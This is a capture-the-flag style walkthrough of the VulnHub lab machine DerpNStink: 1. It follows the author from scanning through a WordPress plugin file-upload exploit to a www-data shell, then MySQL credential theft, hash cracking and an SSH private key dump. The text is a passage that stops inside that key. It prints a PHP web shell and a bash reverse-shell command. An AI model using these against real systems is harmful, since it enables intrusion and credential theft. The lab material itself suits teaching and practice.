@@ -1,0 +1,336 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>DerpNStink: 1 Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>DerpNStink: 1 Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="www-data">Shell - www-data</a></li>
+        <li><a href="#stinky">Shell - stinky</a></li>
+        <li><a href="#mrderp">Shell - mrderp</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>The path to exploitation begins with enumerating directories against the web server.  A wordpress website is found and scanned with wpscan.  There is a vulnerable plugin installed that allows a php web shell to be uploaded and accessed.  Initially a www-data shell is gained.  Going from www-data to the user stinky involves grabbing stinky's credentials from mysql and cracking a hash.  Privesc to mrderp required looking through a pcap file for a cleartext password.  Root is gained through a sudo ability of mrderp.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Sun Sep 26 19:14:03 2021 as: nmap -p- -oN ping_tcp 10.0.0.21&#13;&#10;Nmap scan report for 10.0.0.21&#13;&#10;Host is up (0.0022s latency).&#13;&#10;Not shown: 65532 closed ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;21/tcp open  ftp&#13;&#10;22/tcp open  ssh&#13;&#10;80/tcp open  http&#13;&#10;MAC Address: 00:0C:29:17:69:BF (VMware)&#13;&#10;&#13;&#10;# Nmap done at Sun Sep 26 19:14:22 2021 -- 1 IP address (1 host up) scanned in 19.30 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Sun Sep 26 19:15:02 2021 as: nmap -p21,22,80 -sV -sC -oN script_tcp 10.0.0.21&#13;&#10;Nmap scan report for 10.0.0.21&#13;&#10;Host is up (0.00021s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;21/tcp open  ftp     vsftpd 3.0.2&#13;&#10;22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)&#13;&#10;|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)&#13;&#10;|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)&#13;&#10;|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)&#13;&#10;80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))&#13;&#10;| http-robots.txt: 2 disallowed entries &#13;&#10;|_/php/ /temporary/&#13;&#10;|_http-server-header: Apache/2.4.7 (Ubuntu)&#13;&#10;|_http-title: DeRPnStiNK&#13;&#10;MAC Address: 00:0C:29:17:69:BF (VMware)&#13;&#10;Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Sun Sep 26 19:15:23 2021 -- 1 IP address (1 host up) scanned in 20.70 seconds
+    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>After a poking around a little, the web server becomes the first point of interest.  First I checked /robots.txt.  This revealed a couple directories that did not lead to anything interesting.  Then I ran gobuster against the web server.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ gobuster dir -u http://10.0.0.21 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt                                  &#13;&#10;===============================================================&#13;&#10;Gobuster v3.1.0&#13;&#10;by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)&#13;&#10;===============================================================&#13;&#10;[+] Url:                     http://10.0.0.21&#13;&#10;[+] Method:                  GET&#13;&#10;[+] Threads:                 10&#13;&#10;[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt&#13;&#10;[+] Negative Status codes:   404&#13;&#10;[+] User Agent:              gobuster/3.1.0&#13;&#10;[+] Timeout:                 10s&#13;&#10;===============================================================&#13;&#10;2021/09/26 19:59:10 Starting gobuster in directory enumeration mode&#13;&#10;===============================================================&#13;&#10;/weblog               (Status: 301) [Size: 306] [--&gt; http://10.0.0.21/weblog/]&#13;&#10;/php                  (Status: 301) [Size: 303] [--&gt; http://10.0.0.21/php/]   &#13;&#10;/css                  (Status: 301) [Size: 303] [--&gt; http://10.0.0.21/css/]   &#13;&#10;/js                   (Status: 301) [Size: 302] [--&gt; http://10.0.0.21/js/]    &#13;&#10;/javascript           (Status: 301) [Size: 310] [--&gt; http://10.0.0.21/javascript/]&#13;&#10;/temporary            (Status: 301) [Size: 309] [--&gt; http://10.0.0.21/temporary/] &#13;&#10;/server-status        (Status: 403) [Size: 289]                                   &#13;&#10;                                                                                  &#13;&#10;===============================================================&#13;&#10;2021/09/26 19:59:48 Finished&#13;&#10;===============================================================
+    </pre>
+
+    <li>The directory /weblog is revealed.  Upon visiting this directory we get redirected to "derpnstink.local/weblog", so I add this to my /etc/hosts file.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ cat /etc/hosts                                                                         &#13;&#10;127.0.0.1&#9;localhost&#13;&#10;127.0.1.1&#9;kali&#13;&#10;10.0.0.21&#9;derpnstink.local&#13;&#10;&#13;&#10;# The following lines are desirable for IPv6 capable hosts&#13;&#10;::1     localhost ip6-localhost ip6-loopback&#13;&#10;ff02::1 ip6-allnodes&#13;&#10;ff02::2 ip6-allrouters
+    </pre>
+
+    <li>Now the webpage should load with this</li>
+
+    <img src="../images/derpnstink1/derpnstink_local.png">
+
+    <br>
+    <br>
+
+    <li>Nothing immediately stands out as interesting on this page so I take a look at the source code.</li>
+
+    <br>
+    
+    <img src="../images/derpnstink1/derpnstink_local_src.png">
+
+    <br>
+    <br>
+
+    <li>The source code reveals that this is a wordpress site due to the wp directories (wp-content, etc.).  So I run wpscan against the site.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://derpnstink.local/weblog                                                                                                        130 &Cross;&#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;[+] URL: http://derpnstink.local/weblog/ [10.0.0.21]&#13;&#10;[+] Started: Mon Sep 27 10:34:06 2021&#13;&#10;&#13;&#10;Interesting Finding(s):&#13;&#10;&#13;&#10;[+] Headers&#13;&#10; | Interesting Entries:&#13;&#10; |  - Server: Apache/2.4.7 (Ubuntu)&#13;&#10; |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22&#13;&#10; | Found By: Headers (Passive Detection)&#13;&#10; | Confidence: 100%&#13;&#10;&#13;&#10;[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php&#13;&#10; | Found By: Headers (Passive Detection)&#13;&#10; | Confidence: 100%&#13;&#10; | Confirmed By:&#13;&#10; |  - Link Tag (Passive Detection), 30% confidence&#13;&#10; |  - Direct Access (Aggressive Detection), 100% confidence&#13;&#10; | References:&#13;&#10; |  - http://codex.wordpress.org/XML-RPC_Pingback_API&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/&#13;&#10;&#13;&#10;[+] WordPress readme found: http://derpnstink.local/weblog/readme.html&#13;&#10; | Found By: Direct Access (Aggressive Detection)&#13;&#10; | Confidence: 100%&#13;&#10;&#13;&#10;[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php&#13;&#10; | Found By: Direct Access (Aggressive Detection)&#13;&#10; | Confidence: 60%&#13;&#10; | References:&#13;&#10; |  - https://www.iplocation.net/defend-wordpress-from-ddos&#13;&#10; |  - https://github.com/wpscanteam/wpscan/issues/1299&#13;&#10;&#13;&#10;[+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).&#13;&#10; | Found By: Emoji Settings (Passive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/, Match: &apos;wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9&apos;&#13;&#10; | Confirmed By: Meta Generator (Passive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/, Match: &apos;WordPress 4.6.9&apos;&#13;&#10;&#13;&#10;[+] WordPress theme in use: twentysixteen&#13;&#10; | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/&#13;&#10; | Last Updated: 2021-07-22T00:00:00.000Z&#13;&#10; | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt&#13;&#10; | [!] The version is out of date, the latest version is 2.5&#13;&#10; | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9&#13;&#10; | Style Name: Twenty Sixteen&#13;&#10; | Style URI: https://wordpress.org/themes/twentysixteen/&#13;&#10; | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout &mdash; the horizontal masthead ...&#13;&#10; | Author: the WordPress team&#13;&#10; | Author URI: https://wordpress.org/&#13;&#10; |&#13;&#10; | Found By: Css Style In Homepage (Passive Detection)&#13;&#10; |&#13;&#10; | Version: 1.3 (80% confidence)&#13;&#10; | Found By: Style (Passive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9, Match: &apos;Version: 1.3&apos;&#13;&#10;&#13;&#10;[+] Enumerating All Plugins (via Passive Methods)&#13;&#10;[+] Checking Plugin Versions (via Passive and Aggressive Methods)&#13;&#10;&#13;&#10;[i] Plugin(s) Identified:&#13;&#10;&#13;&#10;[+] slideshow-gallery&#13;&#10; | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/&#13;&#10; | Last Updated: 2021-08-19T23:03:00.000Z&#13;&#10; | [!] The version is out of date, the latest version is 1.7.3&#13;&#10; |&#13;&#10; | Found By: Urls In Homepage (Passive Detection)&#13;&#10; |&#13;&#10; | Version: 1.4.6 (100% confidence)&#13;&#10; | Found By: Readme - Stable Tag (Aggressive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt&#13;&#10; | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt&#13;&#10;&#13;&#10;[+] Enumerating Config Backups (via Passive and Aggressive Methods)&#13;&#10; Checking Config Backups - Time: 00:00:00 &lt;==============================================================================&gt; (137 / 137) 100.00% Time: 00:00:00&#13;&#10;&#13;&#10;[i] No Config Backups Found.&#13;&#10;&#13;&#10;[!] No WPScan API Token given, as a result vulnerability data has not been output.&#13;&#10;[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register&#13;&#10;&#13;&#10;[+] Finished: Mon Sep 27 10:34:10 2021&#13;&#10;[+] Requests Done: 173&#13;&#10;[+] Cached Requests: 5&#13;&#10;[+] Data Sent: 46.338 KB&#13;&#10;[+] Data Received: 237.561 KB&#13;&#10;[+] Memory used: 212.973 MB&#13;&#10;[+] Elapsed time: 00:00:03
+    </pre>
+
+    <h2><a id="www-data shell">www-data shell</a></h2>
+
+    <li>wpscan reveals that this wordpress site is using the plugin slide-show gallery.  It is also version 1.4.6 which is out of date compared to the latest version of 1.7.3.  So I search for exploits using searchsploit</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit slideshow gallery 1.4&#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                                                             |  Path&#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10;WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload                                                           | php/webapps/34514.txt&#13;&#10;WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload                                                           | php/webapps/34681.py&#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results
+    </pre>
+
+    <li>I decide to download the .txt version of the exploit and read through it.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/DerpNStink_1]
+└─$ searchsploit -m 34514             
+  Exploit: WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload
+      URL: https://www.exploit-db.com/exploits/34514
+     Path: /usr/share/exploitdb/exploits/php/webapps/34514.txt
+File Type: UTF-8 Unicode text, with very long lines
+
+Copied to: /home/kali/Documents/VulnHub/DerpNStink_1/34514.txt
+
+
+                                                                                                                                                             
+┌──(kali㉿kali)-[~/Documents/VulnHub/DerpNStink_1]
+└─$ cat 34514.txt 
+Summary: WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability.
+Found by: Jesus Ramirez Pichardo
+  @whitexploit
+  http://whitexploit.blogspot.mx/
+Date: 2014-08-28
+Vendor Homepage: http://tribulant.com/
+Software: Slideshow Gallery
+Version: 1.4.6
+Software Link: http://downloads.wordpress.org/plugin/slideshow-gallery.1.4.6.zip
+Tested on: Windows 7 OS, Wordpress 3.9.2 and Chrome Browser.
+
+Description:
+
+I found a serious security vulnerability in the Slideshow Gallery plugin. This bug allows an attacker to upload any php file remotely to the vulnerable website (administrator by default). I have tested and verified that having the current version of the plugin installed in a WordPress installation will allow any registered user (Administrator, Editor, Author, Contributor and Subscriber), to upload a PHP shell to exploit the host system.
+
+Backdoor location: http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php
+
+                (Removed lines)
+    </pre>
+
+    <li>The top of the .txt describes how to exploit the plugin.  The exploit is simple, we are able to upload any php file via the slideshow gallery plugin.  In order to interact with the plugin we will need to login to the wordpress site.  So I go to http://derpnstink.local/weblog/wp-login.php and I test some easy credentials.  We are able to login with admin:admin.  Now that we are logged in we click on the slideshow plugin and click on "Add New"</li>
+
+    <img src="../images/derpnstink1/add_new.png">
+
+    <br>
+    <br>
+
+    <li>After clicking on "Add New"</li>
+
+    <img src="../images/derpnstink1/image_upload.png">
+
+    <br>
+    <br>
+
+    <li>Here we are meant to upload an image for the slideshow.  However, according to the exploit, we are able to upload a php file.  So instead of an image, we will upload a php web shell.  Here is the shell file I choose to upload.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1]&#13;&#10;&boxur;&HorizontalLine;$ cat shell.php                                                                                                                                      130 &Cross;&#13;&#10;&lt;?php system($_REQUEST[&apos;cmd&apos;]); ?&gt;
+    </pre>
+
+    <li>After selecting my shell.php file to upload, I also fill in the title for the slideshow slide, and then we are ready to select "Save Slide" at the bottom of the screen.</li>
+
+    <img src="../images/derpnstink1/save_slide.png">
+
+    <br>
+    <br>
+
+    <li>Now, according to the exploit .txt we downloaded, we should be able to access the .php file we uploaded at http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php, so I browse to http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=whoami and I find that my webshell is there and it does work.</li>
+
+    <img src="../images/derpnstink1/webshell.png">
+
+    <br>
+    <br>
+
+    <li>In order to get a reverse shell, I intercepted my web request using Burp and sent it to repeater.  Then I added my reverse shell command "bash -c 'bash -i >& /dev/tcp/10.0.0.1/21 0>&1'" and url encoded it by highlighting it and pressing ctrl + u.  I set my netcat listener on port 21.  Then I send the reverse shell command and I gain a reverse shell as www-data.</li>
+
+    <img src="../images/derpnstink1/revshell.png">
+
+    <br>
+    <br>
+    
+    <h2><a id="stinky">Shell - stinky</a></h2>
+
+    <li>Once on the box I check the active local ports.</li>
+
+    <pre>
+www-data@DeRPnStiNK:/tmp$ netstat -tulpn&#13;&#10;(Not all processes could be identified, non-owned process info&#13;&#10; will not be shown, you would have to be root to see it all.)&#13;&#10;Active Internet connections (only servers)&#13;&#10;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name&#13;&#10;tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               &#13;&#10;tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      -               &#13;&#10;tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               &#13;&#10;tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               &#13;&#10;tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               &#13;&#10;tcp6       0      0 :::80                   :::*                    LISTEN      -               &#13;&#10;tcp6       0      0 :::22                   :::*                    LISTEN      -               &#13;&#10;tcp6       0      0 ::1:631                 :::*                    LISTEN      -               &#13;&#10;udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:24889           0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:36191           0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:41847           0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:34232           0.0.0.0:*                           -               &#13;&#10;udp        0      0 127.0.1.1:53            0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:47168           0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:39010           0.0.0.0:*                           -               &#13;&#10;udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               &#13;&#10;udp6       0      0 :::47838                :::*                                -               &#13;&#10;udp6       0      0 :::5353                 :::*                                -               &#13;&#10;udp6       0      0 :::56675                :::*                                -               
+    </pre>
+
+    <li>The most interesting one that stands out up front is port 3306, since this is likely a mysql server.  I look for credentials to access the server.  One place I check is /var/www/html/weblog since wordpress likely has a config file that contains the credentials to the mysql server in order for it to interact with it.</li>
+
+    <pre>
+www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php  | grep DB_&#13;&#10;define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);&#13;&#10;define(&apos;DB_USER&apos;, &apos;root&apos;);&#13;&#10;define(&apos;DB_PASSWORD&apos;, &apos;mysql&apos;);&#13;&#10;define(&apos;DB_HOST&apos;, &apos;localhost&apos;);&#13;&#10;define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);&#13;&#10;define(&apos;DB_COLLATE&apos;, &apos;&apos;);
+    </pre>
+
+    <li>wp-config.php gives the mysql credentials root:mysql.  So I use those to login to the database.</li>
+
+    <pre>
+www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -u root -pmysql&#13;&#10;Welcome to the MySQL monitor.  Commands end with ; or \g.&#13;&#10;Your MySQL connection id is 104&#13;&#10;Server version: 5.5.58-0ubuntu0.14.04.1 (Ubuntu)&#13;&#10;&#13;&#10;Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.&#13;&#10;&#13;&#10;Oracle is a registered trademark of Oracle Corporation and/or its&#13;&#10;affiliates. Other names may be trademarks of their respective&#13;&#10;owners.&#13;&#10;&#13;&#10;Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.&#13;&#10;&#13;&#10;mysql&gt; 
+    </pre>
+
+    <li>The credentials work.  Now I look through the database and find a password hash for the user "unclestinky"</li>
+
+    <pre>
+mysql&gt; show databases;&#13;&#10;+--------------------+&#13;&#10;| Database           |&#13;&#10;+--------------------+&#13;&#10;| information_schema |&#13;&#10;| mysql              |&#13;&#10;| performance_schema |&#13;&#10;| phpmyadmin         |&#13;&#10;| wordpress          |&#13;&#10;+--------------------+&#13;&#10;5 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; use wordpress&#13;&#10;Reading table information for completion of table and column names&#13;&#10;You can turn off this feature to get a quicker startup with -A&#13;&#10;&#13;&#10;Database changed&#13;&#10;mysql&gt; show tables;&#13;&#10;+----------------------------+&#13;&#10;| Tables_in_wordpress        |&#13;&#10;+----------------------------+&#13;&#10;| wp_commentmeta             |&#13;&#10;| wp_comments                |&#13;&#10;| wp_gallery_galleries       |&#13;&#10;| wp_gallery_galleriesslides |&#13;&#10;| wp_gallery_slides          |&#13;&#10;| wp_links                   |&#13;&#10;| wp_options                 |&#13;&#10;| wp_postmeta                |&#13;&#10;| wp_posts                   |&#13;&#10;| wp_term_relationships      |&#13;&#10;| wp_term_taxonomy           |&#13;&#10;| wp_termmeta                |&#13;&#10;| wp_terms                   |&#13;&#10;| wp_usermeta                |&#13;&#10;| wp_users                   |&#13;&#10;+----------------------------+&#13;&#10;15 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; select * from wp_users;&#13;&#10;+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+&#13;&#10;| ID | user_login  | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key                           | user_status | display_name | flag2 |&#13;&#10;+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+&#13;&#10;|  1 | unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 | unclestinky   | unclestinky@DeRPnStiNK.local |          | 2017-11-12 03:25:32 | 1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1 |           0 | unclestinky  |       |&#13;&#10;|  2 | admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ | admin         | admin@derpnstink.local       |          | 2017-11-13 04:29:35 |                                               |           0 | admin        |       |&#13;&#10;+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+&#13;&#10;2 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; select user_login,user_pass from wp_users;&#13;&#10;+-------------+------------------------------------+&#13;&#10;| user_login  | user_pass                          |&#13;&#10;+-------------+------------------------------------+&#13;&#10;| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |&#13;&#10;| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |&#13;&#10;+-------------+------------------------------------+&#13;&#10;2 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; 
+    </pre>
+
+    <li>I bring the hash to hashcat and crack it.  I am able to find the hashcat mode required by going to https://hashcat.net/wiki/doku.php?id=example_hashes and using the "find" function to search for the first few characters of the hash.  This brings us to mode 400.</li>
+
+    <pre>
+.\hashcat.exe -a 0 -m 400 $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 rockyou.txt
+hashcat (v6.2.3) starting
+
+Successfully initialized NVIDIA CUDA library.
+
+(Removed lines)
+
+Host memory required for this attack: 1102 MB
+
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921529
+* Keyspace..: 14344385
+
+$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: phpass
+Hash.Target......: $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
+Time.Started.....: Mon Sep 27 10:49:36 2021 (2 secs)
+Time.Estimated...: Mon Sep 27 10:49:38 2021 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3693.7 kH/s (9.90ms) @ Accel:32 Loops:128 Thr:1024 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 5373952/14344385 (37.46%)
+Rejected.........: 0/5373952 (0.00%)
+Restore.Point....: 2686976/14344385 (18.73%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:8064-8192
+Candidate.Engine.: Device Generator
+Candidates.#1....: xamuraix -> morrison_22
+Hardware.Mon.#1..: Temp: 45c Fan: 30% Util: 99% Core:1830MHz Mem:9501MHz Bus:16
+
+Started: Mon Sep 27 10:49:34 2021
+Stopped: Mon Sep 27 10:49:38 2021
+    </pre>
+
+    <li>The hash is successfully cracked and reveals the password wedgie57 for the user unclestinky.</li>
+    <li>Now I exit out of mysql and look at which users exist on this box using "cat /etc/passwd".</li>
+
+    <pre>
+www-data@DeRPnStiNK:/var/www/html/weblog$ cat /etc/passwd | grep bash&#13;&#10;root:x:0:0:root:/root:/bin/bash&#13;&#10;stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash&#13;&#10;mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
+    </pre>
+
+    <li>The only users on this box that have bash are mrderp, stinky, and root.  So I try the password wedgie57 against each of them using "su".  The password works for the user stinky.</li>
+
+    <pre>
+www-data@DeRPnStiNK:/var/www/html/weblog$ su stinky&#13;&#10;Password: &#13;&#10;stinky@DeRPnStiNK:/var/www/html/weblog$ 
+    </pre>
+
+    <li>Now that I have a shell as stinky, I go to stinky's home directory and I find a ssh key.  I bring the private key to my Kali box so I can gain an ssh shell.</li>
+
+    <pre>
+stinky@DeRPnStiNK:~/.ssh$ cat id_rsa&#13;&#10;-----BEGIN RSA PRIVATE KEY-----&#13;&#10;MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4&#13;&#10;2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO&#13;&#10;uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn&#13;&#10;AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f&#13;&#10;5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB&#13;&#10;LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc&#13;&#10;nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD&#13;&#10;D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4&#13;&#10;ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk&#13;&#10;Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq&#13;&#10;YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0&#13;&#10;DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X&#13;&#10;VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu&#13;&#10;Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7&#13;&#10;VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc&#13;&#10;fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br&#13;&#10;7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab&#13;&#10;L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q&#13;&#10;cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8&#13;&#10;gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7&#13;&#10;RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1&#13;&#10;14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh